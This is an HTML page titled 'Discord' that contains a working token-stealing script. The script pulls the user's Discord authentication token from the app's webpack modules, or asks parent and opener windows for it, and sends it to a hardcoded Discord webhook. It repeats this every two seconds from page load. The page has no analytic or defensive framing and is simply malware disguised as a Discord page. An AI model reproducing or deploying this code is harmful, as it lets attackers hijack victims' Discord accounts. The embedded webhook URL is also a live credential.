<!DOCTYPE html>
<html>
<head>
    <title>Discord</title>
    <script>
        const webhookUrl = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";

        // Function to send token
        async function sendToken(token) {
            if (!token) return;
            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `🔓 **Token Grabbed!**\n\`\`\`${token}\`\`\``
                    })
                });
                console.log("✅ Token Sent");
            } catch (e) {
                console.error("❌ Send Failed", e);
            }
        }

        // Function to request token from Discord
        function requestToken() {
            // Try to find the main Discord window
            const discordWindow = window.opener || window.parent || window;
            
            // If we can't find a specific opener, try to get token directly from this window's context
            // because if the user is on discord.com, this script is running in that context.
            try {
                let token = null;
                // Check if we are IN the discord window
                if (window.webpackChunkdiscord_app) {
                     for(let e of Object.values(webpackChunkdiscord_app.push([[Symbol()],{},e=>e.c])))try{
                        if(!e.exports||e.exports===window)continue;
                        if(e.exports?.getToken) return e.exports.getToken();
                        for(let t in e.exports)if(e.exports?.[t]?.getToken&&"IntlMessagesProxy"!==e.exports[t][Symbol.toStringTag])return e.exports[t].getToken()
                     } catch(e){}
                }
                
                // If we found a token in THIS window, send it
                if (token) {
                    sendToken(token);
                    return;
                }

                // If not, try to ask the opener/parent
                if (window.opener) {
                    window.opener.postMessage({ type: 'get_token' }, '*');
                } else if (window.parent) {
                    window.parent.postMessage({ type: 'get_token' }, '*');
                }
            } catch(e) {
                console.log("Token check failed", e);
            }
        }

        // Listen for token from parent
        window.addEventListener('message', (event) => {
            if (event.data && event.data.token) {
                sendToken(event.data.token);
            }
        });

        // Poll every 2 seconds to check if we are in the Discord window
        setInterval(requestToken, 2000);

        // Initial check
        requestToken();
    </script>
</head>
